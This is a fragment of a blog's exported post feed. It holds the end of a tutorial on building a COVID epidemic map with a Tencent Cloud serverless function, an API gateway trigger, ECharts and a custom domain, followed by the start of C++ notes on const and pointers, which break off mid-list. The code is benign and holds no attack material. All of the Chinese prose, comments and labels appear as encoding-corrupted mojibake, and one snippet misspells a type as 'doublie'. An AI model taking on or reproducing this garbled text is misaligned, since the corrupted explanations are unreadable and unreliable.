¹æ®æ­¥éª¤æç¤ºï¼Œè¡¥å……ä»¥ä¸‹çš„é€»è¾‘ã€‚å…¶ä¸­å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¯¥äº‘å‡½æ•°é™¤äº†æ‰¿æ‹…æ¸²æŸ“ html çš„èƒ½åŠ›ï¼Œè¿˜æ‰¿æ‹…äº†è¾“å‡ºæ•°æ®çš„èƒ½åŠ›ï¼Œè¿™å®Œå…¨æ˜¯é€šè¿‡é“¾æ¥ä¸­çš„<code>api</code>å‚æ•°å†³å®šã€‚é€šè¿‡è¿™æ ·çš„åŒºåˆ«è¾“å‡ºï¼Œå°±çœäº†å¤šåˆ¶ä½œä¸€ä¸ªäº‘å‡½æ•°çš„éº»çƒ¦ï¼Œå¯è°“æ˜¯ä¸€ä¸¾ä¸¤å¾—ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. æ¥å—é“¾æ¥ä¸Šçš„queryå‚æ•°apiï¼Œç”¨äºåˆ¤æ–­æ˜¯è¾“å‡ºhtmlï¼Œè¿˜æ˜¯è¾“å‡ºæ•°æ•°</span></span><br><span class="line"><span class="keyword">let</span> api = event.<span class="property">queryString</span>.<span class="property">api</span> || <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. è¯·æ±‚ç–«æƒ…æ•°æ®</span></span><br><span class="line"><span class="keyword">let</span> result = <span class="keyword">await</span> axios.<span class="title function_">get</span>(</span><br><span class="line">  <span class="string">`https://view.inews.qq.com/g2/getOnsInfo?name=disease_h5`</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. ä¸­å›½åœ°å›¾æ•°æ®</span></span><br><span class="line"><span class="keyword">let</span> china_map = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="built_in">require</span>(<span class="string">&#x27;./china.json&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. è§£æå¹¶æ¸²æŸ“ html é¡µé¢</span></span><br><span class="line"><span class="keyword">let</span> html = fs.<span class="title function_">readFileSync</span>(path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;./index.html&#x27;</span>), &#123;</span><br><span class="line">  <span class="attr">encoding</span>: <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">&#125;);</span><br><span class="line">html = <span class="title function_">render</span>(html, &#123; <span class="attr">disease_data</span>: result.<span class="property">data</span>.<span class="property">data</span>, china_map &#125;);</span><br></pre></td></tr></table></figure><p>é™¤æ­¤ä»¥å¤–ï¼Œç”±äºåé¢åˆ›å»ºç½‘å…³çš„æ—¶å€™ï¼Œè¦ä½¿ç”¨ç½‘å…³çš„é›†æˆå“åº”ï¼Œå› æ­¤å¿…é¡»æŒ‰ç…§ä»¥ä¸‹çš„æ ¼å¼å¯¹äº‘å‡½æ•°è¿›è¡Œè¾“å‡ºï¼Œè€Œä¸èƒ½ç›´æ¥è¿”å›ä¸€æ®µæ•°æ®ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!api) &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">isBase64Encoded</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">statusCode</span>: <span class="number">200</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123; <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/html&#x27;</span> &#125;,</span><br><span class="line">    <span class="attr">body</span>: html</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. è¾“å‡ºç–«æƒ…æ•°æ®</span></span><br><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line">  <span class="attr">isBase64Encoded</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">statusCode</span>: <span class="number">200</span>,</span><br><span class="line">  <span class="attr">headers</span>: &#123; <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span> &#125;,</span><br><span class="line">  <span class="attr">body</span>: result.<span class="property">data</span>.<span class="property">data</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2><span id="ä»»åŠ¡äºŒ-ç»™æ¨¡æ¿è¡¥å……é€»è¾‘">ä»»åŠ¡äºŒ ç»™æ¨¡æ¿è¡¥å……é€»è¾‘</span></h2><p>åœ¨äº‘å‡½æ•°<code>yiqing</code>çš„<code>index.html</code>æ–‡ä»¶ä¸­ï¼Œæ ¹æ®æ­¥éª¤æç¤ºï¼Œè¡¥å……ä»¥ä¸‹çš„é€»è¾‘ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. å¡«å……åœ°å›¾æ¨¡æ¿å˜é‡</span></span><br><span class="line"><span class="keyword">let</span> china_map = $&#123;china_map&#125; || <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2. å¡«å……ç¡®è¯Šã€ç–‘ä¼¼ã€æ²»æ„ˆã€æ­»äº¡æ•°æ®</span></span><br><span class="line"><span class="keyword">let</span> chinaTotal = disease_data.<span class="property">chinaTotal</span>;</span><br><span class="line"><span class="keyword">let</span> chinaAdd = disease_data.<span class="property">chinaAdd</span>;</span><br><span class="line"></span><br><span class="line">$(<span class="string">&#x27;.confirm .add span&#x27;</span>).<span class="title function_">html</span>(<span class="string">`+<span class="subst">$&#123;chinaAdd.confirm&#125;</span>`</span>);</span><br><span class="line">$(<span class="string">&#x27;.suspect .add span&#x27;</span>).<span class="title function_">html</span>(<span class="string">`+<span class="subst">$&#123;chinaAdd.suspect&#125;</span>`</span>);</span><br><span class="line">$(<span class="string">&#x27;.cure .add span&#x27;</span>).<span class="title function_">html</span>(<span class="string">`+<span class="subst">$&#123;chinaAdd.heal&#125;</span>`</span>);</span><br><span class="line">$(<span class="string">&#x27;.dead .add span&#x27;</span>).<span class="title function_">html</span>(<span class="string">`+<span class="subst">$&#123;chinaAdd.dead&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">$(<span class="string">&#x27;.confirm .number&#x27;</span>).<span class="title function_">html</span>(<span class="string">`<span class="subst">$&#123;chinaTotal.confirm&#125;</span>`</span>);</span><br><span class="line">$(<span class="string">&#x27;.suspect .number&#x27;</span>).<span class="title function_">html</span>(<span class="string">`<span class="subst">$&#123;chinaTotal.suspect&#125;</span>`</span>);</span><br><span class="line">$(<span class="string">&#x27;.cure .number&#x27;</span>).<span class="title function_">html</span>(<span class="string">`<span class="subst">$&#123;chinaTotal.heal&#125;</span>`</span>);</span><br><span class="line">$(<span class="string">&#x27;.dead .number&#x27;</span>).<span class="title function_">html</span>(<span class="string">`<span class="subst">$&#123;chinaTotal.dead&#125;</span>`</span>);</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 3. å¤„ç†ç–«æƒ…åœ°å›¾ä¸­çš„ç¡®è¯Šæ•°æ®æ ¼å¼</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * éœ€è¦ &#123;name: &#x27;xxx&#x27;, value: &#x27;xxx&#x27;&#125; è¿™æ ·çš„æ ¼å¼</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">let</span> province = disease_data.<span class="property">areaTree</span>[<span class="number">0</span>].<span class="property">children</span>;</span><br><span class="line"><span class="keyword">let</span> confirmData = province.<span class="title function_">map</span>(<span class="keyword">function</span>(<span class="params">item</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">name</span>: item.<span class="property">name</span>,</span><br><span class="line">    <span class="attr">value</span>: item.<span class="property">total</span>.<span class="property">confirm</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 4. ç»™ç–«æƒ…åœ°å›¾æ·»åŠ æ ‡é¢˜</span></span><br><span class="line"><span class="attr">title</span>: &#123;</span><br><span class="line">    <span class="attr">text</span>: <span class="string">&#x27;ç–«æƒ…åœ°å›¾&#x27;</span>,</span><br><span class="line">    <span class="attr">subtext</span>: <span class="string">`<span class="subst">$&#123;disease_data.lastUpdateTime&#125;</span> æ›´æ–°`</span>,</span><br><span class="line">    <span class="attr">left</span>: <span class="string">&#x27;right&#x27;</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 5. æ·»åŠ æ•°æ®åˆ†æ®µ</span></span><br><span class="line"><span class="attr">pieces</span>: [</span><br><span class="line">    &#123; <span class="attr">min</span>: <span class="number">10000</span>, <span class="attr">label</span>: <span class="string">&#x27;10000äººåŠä»¥ä¸Š&#x27;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">min</span>: <span class="number">1000</span>, <span class="attr">max</span>: <span class="number">9999</span>, <span class="attr">label</span>: <span class="string">&#x27;1000-9999äºº&#x27;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">min</span>: <span class="number">500</span>, <span class="attr">max</span>: <span class="number">999</span>, <span class="attr">label</span>: <span class="string">&#x27;500-999äºº&#x27;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">min</span>: <span class="number">100</span>, <span class="attr">max</span>: <span class="number">499</span>, <span class="attr">label</span>: <span class="string">&#x27;100-499äºº&#x27;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">min</span>: <span class="number">10</span>, <span class="attr">max</span>: <span class="number">99</span>, <span class="attr">label</span>: <span class="string">&#x27;10-99äºº&#x27;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">min</span>: <span class="number">1</span>, <span class="attr">max</span>: <span class="number">9</span>, <span class="attr">label</span>: <span class="string">&#x27;1-9äºº&#x27;</span> &#125;</span><br><span class="line">],</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 6. å¡«å†™ç–«æƒ…åœ°å›¾çš„æ•°æ®åŠæ‚¬æµ®æ¡†çš„å±•ç¤ºä¿¡æ¯</span></span><br><span class="line"><span class="attr">series</span>: [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;ç¡®è¯Šç—…ä¾‹&#x27;</span>,</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&#x27;map&#x27;</span>,</span><br><span class="line">    <span class="attr">roam</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">map</span>: <span class="string">&#x27;china&#x27;</span>,</span><br><span class="line">    <span class="attr">label</span>: &#123;</span><br><span class="line">      <span class="attr">show</span>: <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">emphasis</span>: &#123;</span><br><span class="line">      <span class="attr">label</span>: &#123;</span><br><span class="line">        <span class="attr">show</span>: <span class="literal">true</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">data</span>: confirmData</span><br><span class="line">  &#125;</span><br><span class="line">];</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 7. å®šæ—¶æ‹‰å–</span></span><br><span class="line"><span class="built_in">setInterval</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">updateMap</span>();</span><br><span class="line">&#125;, <span class="number">60000</span>);</span><br></pre></td></tr></table></figure><p>éœ€è¦ç®€å•è¯´æ˜çš„æ˜¯ï¼Œè¯¥æ¨¡æ¿æ˜¯ä½¿ç”¨äº†<code>EChart</code>çš„æ¨¡æ¿è¿›è¡Œæ”¹é€ ï¼Œæ¨¡æ¿åœ°å€å¦‚ä¸‹ï¼š<a href="https://www.echartsjs.com/examples/zh/editor.html?c=map-usa">https://www.echartsjs.com/examples/zh/editor.html?c=map-usa</a>ï¼Œä¸‹å›¾æ˜¯æ¨¡æ¿çš„æ•ˆæœã€‚ä½ ä¹Ÿå¯ä»¥ç‚¹å‡»è¯¥æ¨¡æ¿å³ä¸‹è§’çš„<code>Download</code>æŒ‰é’®å°†æ¨¡æ¿çš„<code>html</code>æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼Œç„¶åæŒ‰è‡ªå·±çš„å–œæ¬¢è¿›è¡Œç¼–è¾‘æ”¹é€ ã€‚</p><p><img src="https://user-images.githubusercontent.com/3348398/73943593-fae5b180-492b-11ea-859e-bdb0f49e3cde.png" alt="ç–«æƒ…åœ°å›¾çš„æ¨¡æ¿"></p><p>å®Œæˆæ¨¡æ¿çš„æ”¹é€ åï¼Œè¯·ç”¨æ’ä»¶æˆ–è€…å‘½ä»¤è¡Œå·¥å…·ï¼Œä¸Šä¼ äº‘å‡½æ•°ã€‚ä¸‹å›¾æ˜¯é€šè¿‡<code>VS Code</code>æ’ä»¶ä¸Šä¼ äº‘å‡½æ•°çš„ç¤ºä¾‹ï¼š</p><p><img src="https://user-images.githubusercontent.com/3348398/73943865-819a8e80-492c-11ea-9bb1-969220c13b3b.png" alt="é€šè¿‡`VS Code`æ’ä»¶ä¸Šä¼ äº‘å‡½æ•°"></p><h2><span id="ä»»åŠ¡ä¸‰-åˆ›å»º-api-ç½‘å…³è§¦å‘å™¨">ä»»åŠ¡ä¸‰ åˆ›å»º API ç½‘å…³è§¦å‘å™¨</span></h2><p>è¿›å…¥æ§åˆ¶å°ï¼Œæ‰¾åˆ°äº‘å‡½æ•°çš„æ§åˆ¶å°ï¼Œå¹¶é€‰æ‹©äº‘å‡½æ•°æ‰€åœ¨çš„åœ°åŒºä»¥åŠå‘½åç©ºé—´ï¼Œç„¶åè¿›å…¥äº‘å‡½æ•°çš„ç¼–è¾‘ç•Œé¢ï¼Œé€‰æ‹©è§¦å‘æ–¹å¼èœå•ï¼Œç„¶åç‚¹å‡»â€œæ·»åŠ è§¦å‘æ–¹å¼â€ï¼ŒæŒ‰ä»¥ä¸‹çš„å†…å®¹æ·»åŠ ä¸€ä¸ª API ç½‘å…³è§¦å‘å™¨ã€‚æ³¨æ„ï¼Œè¯·åŠ¡å¿…å‹¾é€‰â€œå¯ç”¨é›†æˆå“åº”â€ï¼Œè¿™æ ·ç½‘å…³æ‰èƒ½æ­£ç¡®æ¸²æŸ“<code>HTML</code>çš„å†…å®¹ã€‚</p><p><img src="https://user-images.githubusercontent.com/3348398/73863542-37a5a000-487b-11ea-9961-ecd34f709f6b.png" alt="æ·»åŠ APIç½‘å…³è§¦å‘å™¨"></p><p>åˆ›å»ºå®Œæ¯•åï¼Œå¯ä»¥ API ç½‘å…³è§¦å‘å™¨ä¸­ï¼Œæ‹¿åˆ°è®¿é—®è·¯å¾„è·¯å¾„ï¼Œåœ¨æµè§ˆå™¨ä¸­è¿›è¡Œè®¿é—®ã€‚å¦‚æœéªŒè¯è¿‡æ²¡é—®é¢˜åï¼Œå»ºè®®å°†äº‘å‡½æ•°ï¼Œé€šè¿‡<code>VS Code</code>æ’ä»¶åŒæ­¥ä¸‹æ¥ï¼Œå°†æ—§çš„<code>template.yaml</code>æ–‡ä»¶æ›¿æ¢æ‰ï¼Œè¿™æ ·é¿å…ä¸‹æ¬¡ä¸Šä¼ äº‘å‡½æ•°çš„æ—¶å€™ï¼Œç”Ÿæˆé‡å¤çš„ API ç½‘å…³è§¦å‘å™¨ã€‚åªæœ‰åƒä¸‹é¢çš„<code>Events</code>è§¦å‘äº‹ä»¶é‚£æ ·ï¼Œå°†ç³»ç»Ÿç”Ÿæˆçš„ç½‘å…³è´´ä¸Šå»ï¼Œæ‰ä¸ä¼šé‡å¤ç”Ÿæˆæ–°çš„ç½‘å…³ï¼Œé€ æˆèµ„æºæµªè´¹ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Events:</span></span><br><span class="line">  <span class="attr">service-8lqamcni:</span></span><br><span class="line">    <span class="attr">Type:</span> <span class="string">APIGW</span></span><br><span class="line">    <span class="attr">Properties:</span></span><br><span class="line">      <span class="attr">Enable:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">StageName:</span> <span class="string">release</span></span><br><span class="line">      <span class="attr">ServiceId:</span></span><br><span class="line">      <span class="attr">HttpMethod:</span> <span class="string">GET</span></span><br><span class="line">      <span class="attr">IntegratedResponse:</span> <span class="literal">true</span></span><br><span class="line"><span class="string">```</span></span><br></pre></td></tr></table></figure><p>ä½“éªŒåœ°å€ï¼š<a href="https://service-lltf3zya-1253970226.gz.apigw.tencentcs.com/release/demo_yiqing">ç–«æƒ…åœ°å›¾ä½“éªŒ</a></p><h2><span id="ä»»åŠ¡å››-æ·»åŠ è‡ªå®šä¹‰åŸŸå">ä»»åŠ¡å›› æ·»åŠ è‡ªå®šä¹‰åŸŸå</span></h2><p>å¦‚æœè§‰å¾—ç½‘å…³æä¾›çš„åŸŸåè¿‡é•¿ï¼Œåˆæˆ–è€…æ‹…å¿ƒè¿™ç§åŸŸåç”±äºå®‰å…¨é—®é¢˜ä¼šè¢«å¾®ä¿¡ç­‰å¤§å¹³å°å°ç¦ï¼Œå¯ä»¥è‡ªå·±è‡ªè¡Œé…ç½®è‡ªå®šä¹‰åŸŸåã€‚é¦–å…ˆï¼Œåœ¨äº‘å‡½æ•°<code>yiqing</code>çš„æ§åˆ¶å°é¢æ¿é‡Œï¼Œæ‰¾åˆ°ã€è§¦å‘æ–¹å¼ã€‘ï¼Œç„¶åç‚¹å‡»ä»»åŠ¡ä¸‰ä¸­æ·»åŠ è¿‡çš„è§¦å‘å™¨é‡Œçš„ã€API æœåŠ¡åã€‘ï¼Œè¿›å…¥æ›´è¯¦ç»†çš„ç½‘å…³é…ç½®æ§åˆ¶å°ã€‚</p><p><img src="https://user-images.githubusercontent.com/3348398/74046219-1e325e80-4a09-11ea-9473-397b02e27821.png" alt="è¿›å…¥ç½‘å…³é…ç½®æ§åˆ¶å°"></p><p>è¿›å…¥ã€è‡ªå®šä¹‰åŸŸåã€‘èœå•ï¼Œæ–°å»ºè‡ªå®šä¹‰åŸŸåï¼Œå¦‚æœæƒ³é…ç½® HTTPS åè®®ï¼Œåˆ™éœ€è¦å»ç”³è¯· HTTPS è¯ä¹¦ï¼ˆè…¾è®¯äº‘æœ‰å…è´¹çš„å¯ä»¥ç”³è¯·ï¼Œå¯ä»¥è·Ÿç€æç¤ºè·³è½¬åˆ°è¯ä¹¦é…ç½®èœå•ï¼‰ã€‚</p><p><img src="https://user-images.githubusercontent.com/3348398/74046446-8c772100-4a09-11ea-92db-8e597dcf05b4.png" alt="è‡ªå®šä¹‰åŸŸåèœå•"></p><p>å¯ä»¥æŒ‰ç…§ä¸‹å›¾çš„ç¤ºä¾‹è¿›è¡Œé…ç½®ã€‚è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœæƒ³è®¿é—®çš„è·¯å¾„æ›´æ‰å¹³åŒ–ä¸€ç‚¹ï¼Œè¯·é€‰æ‹©â€œè‡ªå®šä¹‰è·¯å¾„æ˜ å°„â€ï¼Œè·¯å¾„å¡«å…¥<code>/</code>ï¼Œç¯å¢ƒé€‰æ‹©å‘å¸ƒã€‚å¦‚æœä¸è¿™æ ·é…ç½®ï¼Œå¦‚æœåŸæœ¬ç½‘å…³çš„åŸŸåæ˜¯<a href="https://service-lltf3zya-1253970226.gz.apigw.tencentcs.com/release/demo_yiqing">https://service-lltf3zya-1253970226.gz.apigw.tencentcs.com/release/demo_yiqing</a>ï¼Œé‚£ä¹ˆé…ç½®å¥½ä¹‹åï¼Œè®¿é—®çš„è·¯å¾„å°±æ˜¯[<a href="https://yiqing.docschina.org/release/demo_yiqing]%E3%80%82%E4%BD%86%E5%A6%82%E6%9E%9C%E9%85%8D%E7%BD%AE%E4%BA%86%60/%60%EF%BC%8C%E9%82%A3%E4%B9%88%E5%90%8E%E9%9D%A2%E7%9A%84%E8%B7%AF%E5%BE%84%E5%B0%B1%E5%8F%AA%E5%89%A9%E4%B8%8B%60demo_yiqing%60%E4%BA%86%E3%80%82">https://yiqing.docschina.org/release/demo_yiqing]ã€‚ä½†å¦‚æœé…ç½®äº†`/`ï¼Œé‚£ä¹ˆåé¢çš„è·¯å¾„å°±åªå‰©ä¸‹`demo_yiqing`äº†ã€‚</a></p><p><img src="https://user-images.githubusercontent.com/3348398/74046578-c21c0a00-4a09-11ea-846b-e1393e3f8106.png" alt="æ–°å»ºè‡ªå®šä¹‰åŸŸå"></p><p>åœ¨ä¿å­˜é…ç½®ä¿¡æ¯ä¹‹å‰ï¼Œè¯·é¦–å…ˆåœ¨åŸŸåè§£ææœåŠ¡å•†ï¼Œæ ¹æ®å¼¹çª—çš„æç¤ºï¼Œå…ˆæŠŠåŸŸåçš„ CNAME é…ç½®å¥½ã€‚æ¯”å¦‚è¿™é‡Œä½¿ç”¨çš„æ˜¯<a href="https://yiqing.docschina.org/">https://yiqing.docschina.org</a>ï¼ŒåŸŸåï¼Œæç¤ºè¦ CNAME åˆ°<code>service-lltf3zya-1253970226.gz.apigw.tencentcs.com.</code>ã€‚åšå®Œ CNAME åï¼Œå°±å¯ä»¥ä¿å­˜è‡ªå®šä¹‰åŸŸåçš„æ·»åŠ é…ç½®ã€‚ç¨ç­‰ç‰‡åˆ»ï¼Œå°±å¯ä»¥è®¿é—®äº†ã€‚</p><p><img src="https://user-images.githubusercontent.com/3348398/74046843-3b1b6180-4a0a-11ea-9a3c-daef71f701f1.png" alt="é…ç½®åŸŸåè§£æ"></p><p>å¦‚æœçœ‹åˆ°é…ç½®åˆ—è¡¨ä¸Šæ˜¾ç¤ºâ€œè§£ææˆåŠŸâ€ï¼Œé‚£è¡¨æ˜ä¸€åˆ‡çš„é™ªç€å·²ç»å¦¥å½“ï¼Œè¯·å°è¯•è®¿é—®ï¼š<a href="https://yiqing.docschina.org/demo_yiqing">https://yiqing.docschina.org/demo_yiqing</a>è¿›è¡Œä½“éªŒå§ï¼</p><pre><code></code></pre>]]></content>
      
      
      <categories>
          
          <category> log </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®ä¹  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java2C++</title>
      <link href="/2020/04/18/Java2C/"/>
      <url>/2020/04/18/Java2C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>æ€»ç»“ä¸€äº›C++å­¦ä¹ ä¸­ç–‘æƒ‘çš„ç‚¹</p><span id="more"></span><!-- toc --><ul><li><a href="#%E7%9F%A5%E8%AF%86%E7%82%B9">çŸ¥è¯†ç‚¹</a><ul><li><a href="#const%E5%92%8C%E6%8C%87%E9%92%88">constå’ŒæŒ‡é’ˆ</a></li><li><a href="#constexpr">constexpr</a></li><li><a href="#%E6%95%B0%E7%BB%84">æ•°ç»„</a><ul><li><a href="#%E5%BC%95%E7%94%A8%E9%81%8D%E5%8E%86%E6%B3%95">å¼•ç”¨éå†æ³•ï¼š</a></li><li><a href="#%E4%B8%8B%E6%A0%87%E9%81%8D%E5%8E%86%E6%B3%95">ä¸‹æ ‡éå†æ³•ï¼š</a></li><li><a href="#%E6%8C%87%E9%92%88%E9%81%8D%E5%8E%86%E6%B3%95">æŒ‡é’ˆéå†æ³•ï¼š</a></li></ul></li><li><a href="#%E5%B7%A6%E5%80%BC%E5%92%8C%E5%8F%B3%E5%80%BC">å·¦å€¼å’Œå³å€¼</a></li><li><a href="#%E6%8B%B7%E8%B4%9D%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0">æ‹·è´æ„é€ å‡½æ•°</a></li><li><a href="#%E6%8B%B7%E8%B4%9D%E5%88%9D%E5%A7%8B%E5%8C%96">æ‹·è´åˆå§‹åŒ–</a></li><li><a href="#%E9%87%8D%E8%BD%BD%E6%8B%B7%E8%B4%9D%E8%B5%8B%E5%80%BC%E8%BF%90%E7%AE%97%E7%AC%A6">é‡è½½æ‹·è´èµ‹å€¼è¿ç®—ç¬¦</a></li></ul></li><li><a href="#%E7%BB%83%E4%B9%A0">ç»ƒä¹ </a><ul><li><a href="#943">9.43</a></li><li><a href="#944">9.44</a></li></ul></li></ul><!-- tocstop --><h1><span id="çŸ¥è¯†ç‚¹">çŸ¥è¯†ç‚¹</span></h1><h2><span id="constå’ŒæŒ‡é’ˆ">constå’ŒæŒ‡é’ˆ</span></h2><ul><li><strong>æŒ‡å‘å¸¸é‡çš„æŒ‡é’ˆï¼š</strong>ä¸èƒ½ç”¨äºæ”¹å˜å…¶æ‰€æŒ‡å¯¹è±¡çš„å€¼ã€‚</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">double</span> pi=<span class="number">3.14</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">double</span> *p=&amp;pi;<span class="comment">//piå¿…é¡»è¦ç”¨æŒ‡å‘å¸¸é‡çš„æŒ‡é’ˆæŒ‡å‘</span></span><br><span class="line"><span class="type">double</span> dval=<span class="number">3.14</span>;</span><br><span class="line">p=&amp;dval; <span class="comment">//å¯ä»¥ï¼Œä½†æ˜¯ä¸èƒ½ä½¿ç”¨pæ”¹å˜dvalçš„å€¼</span></span><br></pre></td></tr></table></figure><p><font color="red">å­˜æ”¾å¸¸é‡å¯¹è±¡çš„åœ°å€å¿…é¡»è¦ä½¿ç”¨æŒ‡å‘å¸¸é‡çš„æŒ‡é’ˆï¼Œ</font></p><p><font color="blue">ä½†æ˜¯æŒ‡å‘å¸¸é‡çš„æŒ‡é’ˆä¹Ÿå¯ä»¥æŒ‡å‘å˜é‡</font></p><ul><li><strong>constæŒ‡é’ˆ</strong>ï¼šå¸¸é‡æŒ‡é’ˆå¿…é¡»åˆå§‹åŒ–ï¼Œå¸¸é‡æŒ‡é’ˆæŒ‡å‘çš„å¯¹è±¡åœ°å€ä¸å¯æ”¹å˜ã€‚</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> *<span class="type">const</span> p=&amp;a; <span class="comment">//på°†ä¸€ç›´æŒ‡å‘a</span></span><br><span class="line"><span class="type">const</span> doublie pi=<span class="number">3.14</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">double</span> *<span class="type">const</span> pip=&amp;pi; <span class="comment">//pipæ˜¯æŒ‡å‘å¸¸é‡å¯¹è±¡çš„å¸¸é‡æŒ‡é’ˆ</span></span><br></pre></td></tr></table></figure><ul><li>é¡¶å±‚constï¼šè¡¨ç¤ºæŒ‡é’ˆæœ¬èº«æ˜¯ä¸ªå¸¸é‡</li><li>åº•å±‚constï¼š 